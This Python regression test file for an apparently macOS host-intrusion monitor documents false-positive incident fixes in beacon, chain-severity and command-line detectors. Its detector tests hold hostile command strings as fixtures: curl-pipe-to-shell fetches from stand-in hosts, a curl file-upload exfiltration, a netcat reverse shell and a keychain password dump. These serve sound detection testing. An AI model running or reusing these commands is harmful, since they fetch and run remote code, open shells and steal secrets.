#!/usr/bin/env python3
"""The 2026-09-19 batch: 46 open incidents, and not one is a detection miss.

Every defect below is a WRITE-BACK failure. The grader ran, reached the right
answer, wrote it into the evidence — and the queue could not follow it. That
is why the four previous false-alarm batches each shipped a better grader and
the open count still climbed: a grader that improves only the findings it has
not made yet cannot drain a queue of incidents already open.

Counted by distinct fact rather than by row, the 46 were about a dozen things.

  D1  `_close_regraded_incidents` joined `'signal:' || signals.fingerprint =
      incidents.correlation_key`. That is correct only for an incident keyed
      on a raw fingerprint. Since the process/beacon identity redesign the
      incidents carrying the custody grades are keyed on their CASE
      (`signal:process:sha:<sha>`) while their signals stay path-keyed
      (`process:<path>:adhoc:<sha>`), so the join matched nothing at all.
      MEASURED on the live store: 23 of 41 open signal incidents had no
      joinable signal row, INCLUDING EVERY `process:sha:` one — the entire
      population the function was written for. Incident #509 sat OPEN at HIGH
      holding two LOW `operator-vouched` re-grades: the operator had signed a
      vouch for exactly those bytes at exactly that path, which the ladder
      calls the strongest rung it has because it is the only one code running
      as the operator cannot mint silently. #505 held eight MEDIUM
      `package-managed` re-grades. #501 held a MEDIUM `build-output`.

      The unit test passed throughout, because it builds a finding with no
      `case_fingerprint` — the one shape the join could handle.

  D2  `correlate()` asserted a flat "CRITICAL" for every chain regardless of
      what its two legs said. #511, CRITICAL, was built from a LOW leg and a
      MEDIUM one: `/bin/bash`'s bytes changed (already graded
      `custody=os-vendor`, the persistence sensor's own detail reading "the
      shape of a system update, not of a config edit") correlated with the
      operator's agent harness running `bash -c`. A chain escalates its legs;
      it does not manufacture a severity out of two explained facts.

  D3  `_beacon_dispersion` counted only addresses live in the CURRENT scan, so
      a rotating endpoint — which by definition holds one or two sockets at a
      time and moves across hours — never reached the dispersion threshold.
      Eight HIGH per-address beacon incidents for one program on port 443
      (#510, #512-#518) sat beside an already-open rotating case for that same
      (program, port) which carried one of the very same addresses (#506).

  D4  `raw-ip-fetch` fired on `curl http://127.0.0.1:8080/health`. The threat
      it names is a C2 reached without DNS; a loopback or RFC1918 address is
      not one. Aegis already knew this — the listener sensor drops loopback
      binds for exactly this reason — the knowledge had just never reached the
      argv scanner.

  D5  Composite idioms skipped over shell separators, so two unrelated
      commands on one line fused into an idiom neither of them was. An agent
      harness passes a whole session as a single `bash -c` string, which makes
      this routine rather than exotic: `nohup ./llama-server &` early in the
      line and a `curl` later in it reported as `nohup-curl-fileless`, HIGH.
      `network-fetch` already had the right instinct with `[^\\n|]`.

  D6  The behavior signal's identity was `sha256(argv)`, and the agent harness
      puts a per-session nonce in every command it runs (the shell-snapshot
      path). Normalize that nonce for case grouping only. Exact fingerprints
      remain distinct: this does not confer acquired tolerance or carry a
      reviewed verdict across sessions. Weak standalone behavior must be
      graded accurately by its producer (see test_mount_signal_precision).

The shape shared by D1, D3 and D6 is the one worth remembering, because it is
the same one the 2026-09-17 batch named and it has now recurred one level up:
an identity was keyed on the OCCASION of an observation rather than on its
subject. There it was a path, a plist, a socket. Here it is a join column, a
stopwatch, and a session nonce.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from conftest import aegis                                    # noqa: E402
from test_regression import Sandbox                           # noqa: E402

T0 = 1_700_000_000

# The live shape: a process finding whose SIGNAL is path-keyed and whose CASE
# is content-keyed. Both spellings are taken verbatim from the reference Mac.
SHA = "c4e8b5e15ef851b60ba02fd3db900a9082435e4bfbc790a5c48b619147eb0855"
PATH = "/Users/charlie/actions-runners/lab-os/bin/Runner.Listener"
SIG_FP = "process:%s:adhoc:%s" % (PATH, SHA)
CASE_FP = "process:sha:%s" % SHA


def _process_finding(severity, custody=None):
    return aegis.finding(
        severity, "process", "Suspicious running process",
        "%s (adhoc) running from user-writable path" % PATH,
        SIG_FP, case_fingerprint=CASE_FP, path=PATH, program=PATH,
        sha256=SHA, custody=custody,
        subject=aegis._subject("process", PATH, content=SHA))


class D1CaseKeyedIncidentsCanBeRegraded(Sandbox):
    """The exit the custody ladder depends on has to reach case-keyed rows."""

    def _row(self):
        db = aegis._event_connection()
        try:
            row = db.execute(
                "SELECT * FROM incidents WHERE correlation_key=?",
                ("signal:" + CASE_FP,)).fetchone()
            return dict(row) if row else None
        finally:
            db.close()

    def test_an_operator_vouched_regrade_closes_a_case_keyed_incident(self):
        aegis.record_security_state([_process_finding("HIGH")], now=T0)
        self.assertEqual("OPEN", self._row()["status"])
        aegis.record_security_state(
            [_process_finding("LOW", custody="operator-vouched")], now=T0 + 60)
        row = self._row()
        # BEFORE: OPEN at HIGH forever. The join was on signals.fingerprint,
        # which is path-keyed, while this incident is keyed on its case — so
        # the re-grade exit could not see it. Live: #509.
        self.assertEqual(
            "FALSE_POSITIVE", row["status"],
            "a case-keyed incident cannot follow its own evidence down")
        self.assertIn("re-graded", row["resolution"] or "")

    def test_a_package_managed_regrade_closes_it_too(self):
        aegis.record_security_state([_process_finding("HIGH")], now=T0)
        aegis.record_security_state(
            [_process_finding("MEDIUM", custody="package-managed")],
            now=T0 + 60)
        self.assertEqual("FALSE_POSITIVE", self._row()["status"])

    def test_the_severity_ratchet_still_holds(self):
        """ARCHITECTURE.md: de-escalation is the operator's verdict, not
        custody's. The exit closes the case; it never rewrites the severity
        the operator was shown."""
        aegis.record_security_state([_process_finding("HIGH")], now=T0)
        aegis.record_security_state(
            [_process_finding("LOW", custody="operator-vouched")], now=T0 + 60)
        self.assertEqual("HIGH", self._row()["severity"])

    def test_a_still_high_regrade_does_not_close(self):
        aegis.record_security_state([_process_finding("HIGH")], now=T0)
        aegis.record_security_state([_process_finding("HIGH")], now=T0 + 60)
        self.assertEqual("OPEN", self._row()["status"])

    def test_no_dismissals_row_is_written(self):
        """A machine verdict must never feed backtest precision or acquired
        tolerance — the same discipline age-out holds."""
        aegis.record_security_state([_process_finding("HIGH")], now=T0)
        aegis.record_security_state(
            [_process_finding("LOW", custody="operator-vouched")], now=T0 + 60)
        db = aegis._event_connection()
        try:
            self.assertEqual(
                0, db.execute("SELECT COUNT(*) FROM dismissals").fetchone()[0])
        finally:
            db.close()


class D2AChainEscalatesItsLegs(unittest.TestCase):
    """A chain's severity comes FROM its legs. Two explained facts are not a
    CRITICAL just because they touched the same entity."""

    def _sev(self, left_sev, right_sev, **flags):
        left = {"severity": left_sev}
        right = {"severity": right_sev}
        left.update(flags.get("left", {}))
        right.update(flags.get("right", {}))
        return aegis._chain_severity([(left, right)])

    def test_two_high_legs_are_still_critical(self):
        self.assertEqual("CRITICAL", self._sev("HIGH", "HIGH"))

    def test_a_high_and_a_critical_leg_are_critical(self):
        self.assertEqual("CRITICAL", self._sev("HIGH", "CRITICAL"))

    def test_a_low_leg_and_a_medium_leg_are_not_critical(self):
        """Incident #511: an Apple system update correlated with the
        operator's own shell. It read CRITICAL for 24 days."""
        self.assertEqual("MEDIUM", self._sev("LOW", "MEDIUM"))

    def test_two_medium_legs_escalate_one_step(self):
        self.assertEqual("HIGH", self._sev("MEDIUM", "MEDIUM"))

    def test_an_attack_defined_leg_is_never_softened(self):
        """A payload stays a payload whoever owns the other half."""
        self.assertEqual(
            "CRITICAL",
            self._sev("LOW", "LOW", right={"attack_defined": True}))


class D3DispersionIsReadFromHistory(unittest.TestCase):
    """A rotating endpoint rotates — it does not hold four sockets at once."""

    def test_sequential_addresses_still_count_as_dispersed(self):
        prog = "/Applications/bioREADr.app/Contents/MacOS/zotero"
        span = aegis.BEACON_MIN_SPAN_SECS + 60
        sightings = {}
        for i, ip in enumerate(("3.230.40.168", "54.158.108.28",
                                "54.236.165.102", "35.173.71.119")):
            # Each address clears the recurrence gate on its own, and no two
            # are ever live in the same scan — which is what rotation means.
            base = T0 + i * span * 2
            sightings[(prog, ip, "443")] = tuple(
                base + n * (span // (aegis.BEACON_MIN_SCANS - 1))
                for n in range(aegis.BEACON_MIN_SCANS))
        disp = aegis._beacon_dispersion(sightings)
        self.assertGreaterEqual(
            len(disp[(aegis._program_subject(prog), "443")]),
            aegis.BEACON_DISPERSION_MIN,
            "eight addresses over two days read as eight fixed beacons")

    def test_a_fixed_endpoint_c2_still_has_a_dispersion_of_one(self):
        """The detection this sensor exists for is untouched."""
        prog = "/tmp/payload"
        span = aegis.BEACON_MIN_SPAN_SECS + 60
        sightings = {(prog, "185.234.72.19", "443"): tuple(
            T0 + n * (span // (aegis.BEACON_MIN_SCANS - 1))
            for n in range(aegis.BEACON_MIN_SCANS))}
        disp = aegis._beacon_dispersion(sightings)
        self.assertEqual(1, len(disp[(aegis._program_subject(prog), "443")]))

    def test_churn_that_never_recurs_does_not_vote(self):
        """The gate is still the only thing allowed to count."""
        prog = "/tmp/payload"
        sightings = {(prog, "1.2.3.%d" % n, "443"): (T0,) for n in range(9)}
        self.assertEqual({}, aegis._beacon_dispersion(sightings))


class D4RawIpFetchMeansARoutableAddress(unittest.TestCase):
    def _markers(self, argv):
        return {n for n, _ in aegis._argv_signals(argv)}

    def test_a_loopback_health_check_is_not_a_c2_fetch(self):
        self.assertNotIn("raw-ip-fetch",
                         self._markers("curl http://127.0.0.1:8080/health"))

    def test_rfc1918_is_not_a_c2_fetch(self):
        for host in ("10.0.0.5", "192.168.1.1", "172.16.4.2"):
            self.assertNotIn("raw-ip-fetch",
                             self._markers("curl http://%s/x" % host), host)

    def test_link_local_metadata_is_not_a_c2_fetch(self):
        self.assertNotIn(
            "raw-ip-fetch",
            self._markers("curl http://169.254.169.254/latest/meta-data"))

    def test_cgnat_is_not_a_c2_fetch(self):
        self.assertNotIn("raw-ip-fetch",
                         self._markers("curl http://100.64.1.2/x"))

    def test_a_public_bare_ip_still_fires(self):
        for host in ("185.234.72.19", "104.21.5.7", "100.60.218.24"):
            self.assertIn("raw-ip-fetch",
                          self._markers("curl http://%s/p.sh" % host), host)


class D5CompositeIdiomsStayInsideOneCommand(unittest.TestCase):
    def _markers(self, argv):
        return {n for n, _ in aegis._argv_signals(argv)}

    def test_nohup_and_a_later_unrelated_curl_are_two_facts(self):
        self.assertNotIn("nohup-curl-fileless", self._markers(
            "nohup ./llama-server & sleep 2; "
            "curl http://127.0.0.1:8080/health"))

    def test_real_fileless_staging_still_fires(self):
        self.assertIn("nohup-curl-fileless",
                      self._markers("nohup curl http://evil/p -o /tmp/p"))
        self.assertIn("nohup-curl-fileless",
                      self._markers("nohup sh -c 'curl http://evil/p | sh' &"))

    def test_a_mount_and_a_later_word_are_two_facts(self):
        self.assertNotIn("hdiutil-nobrowse",
                         self._markers("hdiutil attach a.dmg; echo -nobrowse"))
        self.assertIn("hdiutil-nobrowse",
                      self._markers("hdiutil attach /tmp/x.dmg -nobrowse"))

    def test_reading_a_quarantine_xattr_is_not_stripping_it(self):
        self.assertNotIn("quarantine-strip", self._markers(
            "xattr -l f; grep com.apple.quarantine out"))
        self.assertIn("quarantine-strip", self._markers(
            "xattr -d com.apple.quarantine /tmp/x"))

    def test_the_other_composites_still_detect(self):
        for argv, marker in (
                ("curl -k https://e/x | base64 -d | sh", "curl-insecure-pipe"),
                ("curl -F file=@/tmp/s.zip https://e/u", "curl-exfil-post"),
                ("nc -e /bin/sh 1.2.3.4 4444", "netcat-exec"),
                ("launchctl load /tmp/eve.plist", "launchctl-tmp"),
                ("security find-generic-password -s x", "keychain-dump")):
            self.assertIn(marker, self._markers(argv), argv)


class D6BehaviorIdentityIsNotASessionNonce(unittest.TestCase):
    """Group equivalent command shapes without granting cross-session trust."""

    PROLOGUE = ("/bin/bash -c source /Users/c/.claude/shell-snapshots/"
                "snapshot-bash-%s-%s.sh 2>/dev/null || true && %s")

    def test_the_same_command_in_two_sessions_is_one_case(self):
        a = self.PROLOGUE % ("1789621597725", "dtpjwq", "hdiutil attach x -nobrowse")
        b = self.PROLOGUE % ("1789508855066", "pb5dpw", "hdiutil attach x -nobrowse")
        self.assertEqual(aegis._argv_case_identity(a),
                         aegis._argv_case_identity(b),
                         "the same command shape differs only in its session nonce")

    def test_a_different_command_is_a_different_case(self):
        a = self.PROLOGUE % ("1789621597725", "dtpjwq", "hdiutil attach x -nobrowse")
        b = self.PROLOGUE % ("1789621597725", "dtpjwq", "curl http://185.1.2.3/p | sh")
        self.assertNotEqual(aegis._argv_case_identity(a),
                            aegis._argv_case_identity(b),
                            "a verdict on one command would cover another")

    def test_the_signal_fingerprint_still_carries_the_exact_argv(self):
        """Normalization names the CASE. It must never blunt the alert: a
        genuinely new command still has to announce itself once."""
        a = self.PROLOGUE % ("1789621597725", "dtpjwq", "hdiutil attach x -nobrowse")
        b = self.PROLOGUE % ("1789508855066", "pb5dpw", "hdiutil attach x -nobrowse")
        self.assertNotEqual(aegis.hashlib.sha256(a.encode()).hexdigest(),
                            aegis.hashlib.sha256(b.encode()).hexdigest())

    def test_per_session_temp_roots_normalize(self):
        self.assertEqual(
            aegis._argv_case_identity("/var/folders/9n/aaaa0000/T/x/app"),
            aegis._argv_case_identity("/var/folders/9n/bbbb1111/T/x/app"))

    def test_build_temp_dirs_normalize(self):
        self.assertEqual(
            aegis._argv_case_identity("/c/.cache/uv/builds-v0/.tmpz6gYYl/bin/python"),
            aegis._argv_case_identity("/c/.cache/uv/builds-v0/.tmpjipRHP/bin/python"))


if __name__ == "__main__":
    unittest.main()


class D7ARetirementSweepMustNotEatItsOwnSuccessor(unittest.TestCase):
    """Found by the sandbox while pinning D1, and worse than D1.

    `_LEGACY_PROCESS_KEY_RE` retires the pre-2026-08-23 process key shape
    `signal:process:<path>:<trust>:<sha256>`. It is spelled `.*:[0-9a-f]{64}$`,
    which also matches the CURRENT content-keyed case `signal:process:sha:
    <sha256>` — `.*` happily being the single component "sha". On a store
    where that migration has not already run, every process incident is
    therefore closed as "superseded" in the very scan that opened it: the
    monitor discards its own process findings and says nothing. The reference
    Mac is immune only because it migrated weeks ago. A fresh install, a
    restore from backup, or a second machine upgrading late is not — which is
    precisely the population the migration's own FROZEN-copies note names.
    """

    def test_the_current_case_key_is_not_treated_as_retired(self):
        key = "signal:process:sha:%s" % SHA
        self.assertIsNone(aegis._LEGACY_PROCESS_KEY_RE.match(key),
                          "the sweep retires the identity that replaced it")

    def test_the_genuinely_retired_shape_still_matches(self):
        self.assertIsNotNone(aegis._LEGACY_PROCESS_KEY_RE.match(
            "signal:process:/usr/local/bin/x:adhoc:%s" % SHA))


class D2bTheTwoKindsOfChainRule(unittest.TestCase):
    """The credential-capture rule's own comment says its pair is worth more
    than two HIGHs. It is — and the reason is that its left predicate is a
    payload idiom, not that every chain is CRITICAL. The rules that select on
    CATEGORY alone have to earn it from their legs."""

    def test_a_marker_selected_rule_is_critical_on_any_legs(self):
        self.assertEqual("CRITICAL", aegis._chain_severity(
            [({"severity": "HIGH"}, {"severity": "MEDIUM"})],
            attack_defined=True))

    def test_a_category_selected_rule_derives_from_its_legs(self):
        self.assertEqual("MEDIUM", aegis._chain_severity(
            [({"severity": "LOW"}, {"severity": "MEDIUM"})]))

    def test_a_category_selected_rule_is_still_critical_on_two_high_legs(self):
        """A real intrusion's signals are not custody-explained, so a genuine
        chain is untouched by any of this."""
        self.assertEqual("CRITICAL", aegis._chain_severity(
            [({"severity": "HIGH"}, {"severity": "HIGH"})]))
